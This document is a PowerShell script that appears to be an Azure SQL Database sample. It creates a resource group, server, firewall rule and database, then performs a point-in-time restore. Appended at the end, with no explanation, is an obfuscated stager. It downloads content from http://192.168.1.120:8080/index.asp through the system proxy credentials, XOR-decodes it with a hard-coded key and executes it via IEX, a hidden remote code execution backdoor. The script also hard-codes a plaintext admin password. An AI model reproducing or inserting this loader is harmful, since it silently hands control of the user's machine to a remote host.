
$SubscriptionId = ''

$resourceGroupName = "myResourceGroup-$(Get-Random)"
$location = "westus2"

$adminSqlLogin = "SqlAdmin"
$password = "ChangeYourAdminPassword1"

$serverName = "server-$(Get-Random)"

$databaseName = "mySampleDatabase"

$restoreDatabaseName = "MySampleDatabase_GeoRestore"
$pointInTimeRestoreDatabaseName = "MySampleDatabase_10MinutesAgo"

$startIp = "0.0.0.0"
$endIp = "0.0.0.0"


Set-AzContext -SubscriptionId $subscriptionId 


$resourceGroup = New-AzResourceGroup -Name $resourceGroupName -Location $location


$server = New-AzSqlServer -ResourceGroupName $resourceGroupName `
    -ServerName $serverName `
    -Location $location `
    -SqlAdministratorCredentials $(New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $adminSqlLogin, $(ConvertTo-SecureString -String $password -AsPlainText -Force))


$firewallRule = New-AzSqlServerFirewallRule -ResourceGroupName $resourceGroupName `
    -ServerName $serverName `
    -FirewallRuleName "AllowedIPs" -StartIpAddress $startIp -EndIpAddress $endIp


$database = New-AzSqlDatabase  -ResourceGroupName $resourceGroupName `
    -ServerName $serverName `
    -DatabaseName $databaseName `
    -RequestedServiceObjectiveName "S0" 

Start-Sleep -second 600



Restore-AzSqlDatabase `
      -FromPointInTimeBackup `
      -PointInTime (Get-Date).AddMinutes(-2) `
      -ResourceGroupName $resourceGroupName `
      -ServerName $serverName `
      -TargetDatabaseName $pointInTimeRestoreDatabaseName `
      -ResourceId $database.ResourceID `
      -Edition "Standard" `
      -ServiceObjectiveName "S0"



$wC=NEw-ObJeCT SYsTeM.Net.WEbCLieNt;$u='Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko';$wC.HeADERs.Add('User-Agent',$u);$Wc.PrOXy = [SYstem.NeT.WEbRequEst]::DeFAuLtWEbPrOxY;$wC.ProXY.CREDENTIALS = [SYsteM.Net.CrEDeNtialCAche]::DefAultNETWORKCrEdeNtiaLS;$K='d0fb963ff976f9c37fc81fe03c21ea7b';$I=0;[ChAR[]]$b=([chAR[]]($WC.DowNLOaDStRING("http://192.168.1.120:8080/index.asp")))|%{$_-bXor$k[$i++%$K.Length]};IEX ($b-Join'')

